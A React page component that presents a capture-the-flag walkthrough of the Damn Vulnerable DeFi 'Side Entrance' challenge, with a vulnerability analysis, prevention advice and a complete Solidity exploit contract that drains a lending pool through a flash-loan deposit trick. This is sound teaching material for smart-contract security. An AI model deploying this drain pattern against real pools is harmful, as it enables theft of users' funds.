import React from 'react';
import { Container, Row, Col, Accordion, Alert } from 'react-bootstrap';
import { Shield, Github, AlertTriangle } from 'lucide-react';

const DamnSideEntrance = () => {
  return (
    <Container className="py-5">
      <Row className="mb-5">
        <Col>
          <h1 className="display-4 mb-4">
            <Shield className="me-3" size={48} />
            Damn Vulnerable DeFi - Side Entrance
          </h1>
          <p className="lead text-muted">
            A deep dive into exploiting vulnerabilities in DeFi lending pools
          </p>
          <Alert variant="info" className="d-flex align-items-center">
            <Github className="me-2" />
            <span>
              CTF GitHub Repository:{' '}
              <a href="https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0" target="_blank" rel="noopener noreferrer">
                https://github.com/tinchoabbate/damn-vulnerable-defi
              </a>
            </span>
          </Alert>
        </Col>
      </Row>

      <Accordion>
        <Accordion.Item eventKey="0">
          <Accordion.Header>
            <span className="h5 mb-0">Side Entrance Attack Walkthrough</span>
          </Accordion.Header>
          <Accordion.Body>
            <h5>🎯 Goal:</h5>
            <p>Drain 1000 ETH from the vulnerable SideEntranceLenderPool contract.</p>

            <h5>💥 What's the vulnerability?</h5>
            <p>The pool has these features:</p>
            <ul>
              <li>Anyone can deposit and withdraw ETH.</li>
              <li>It also gives flash loans (borrow and repay in the same transaction).</li>
              <li>Flash loan gives ETH and then calls your contract's execute() function.</li>
            </ul>

            <Alert variant="danger" className="d-flex align-items-start">
              <AlertTriangle className="me-2 mt-1" />
              <div>
                <strong>Critical Vulnerability:</strong> The contract tracks deposits and flash loan repayments 
                using the same balance mapping, allowing a malicious actor to use the flash loaned amount 
                as their own deposit balance.
              </div>
            </Alert>

            <h5>🔍 Detailed Analysis:</h5>
            <p>The vulnerability stems from how the pool tracks balances:</p>
            <ol>
              <li>The pool uses a simple <code>balances</code> mapping to track both deposits and flash loan repayments.</li>
              <li>When you repay a flash loan via deposit, it increases your <code>balances</code> entry.</li>
              <li>The flash loan repayment check only verifies that the contract's ETH balance increased, not how it increased.</li>
              <li>This creates an accounting inconsistency where the same ETH is counted both as repaid loan and as your deposit.</li>
            </ol>

            <h5>🚀 Attack Plan:</h5>
            <ol>
              <li>Take a flash loan of 1000 ETH.</li>
              <li>In the execute() function, immediately deposit the 1000 ETH back.</li>
              <li>The pool thinks the flash loan was repaid — ✅.</li>
              <li>But now your contract has a 1000 ETH internal balance in the pool.</li>
              <li>You call withdraw() to take out the full 1000 ETH.</li>
              <li>Finally, send the ETH to your wallet.</li>
            </ol>

            <h5>🛡️ Prevention:</h5>
            <p>To prevent this attack, the contract should:</p>
            <ul>
              <li>Separate the tracking of deposits and flash loan repayments</li>
              <li>Use a dedicated variable to track outstanding flash loans</li>
              <li>Implement checks-effects-interactions pattern</li>
              <li>Consider using OpenZeppelin's ReentrancyGuard</li>
            </ul>

            <h5>Exploit Contract:</h5>
            <pre className="bg-light p-3 rounded mb-4">
{`contract Attacker {
    SideEntranceLenderPool public pool;
    address public owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    // Step 1: Start the attack
    function attack() external {
        pool.flashLoan(1000 ether); // borrow all ETH
        pool.withdraw(); // withdraw credited deposit
        payable(owner).transfer(address(this).balance); // send to attacker
    }

    // Step 2: Pool calls this after giving us the loan
    function execute() external payable {
        pool.deposit{value: msg.value}(); // deposit the ETH back
    }

    receive() external payable {}
}`}
            </pre>

            <h5>⚙️ Attack Execution Flow:</h5>
            <ol>
              <li>Attacker calls <code>attack()</code></li>
              <li>Contract takes 1000 ETH flash loan</li>
              <li>Pool calls <code>execute()</code> with 1000 ETH</li>
              <li>Attacker deposits the 1000 ETH back, increasing their balance</li>
              <li>Flash loan is considered repaid</li>
              <li>Attacker withdraws their 1000 ETH balance</li>
              <li>ETH is transferred to attacker's wallet</li>
            </ol>

            <Alert variant="warning">
              This attack demonstrates how improper accounting separation between different contract 
              functionalities can lead to critical vulnerabilities, even without traditional reentrancy.
            </Alert>
          </Accordion.Body>
        </Accordion.Item>
      </Accordion>
    </Container>
  );
};

export default DamnSideEntrance;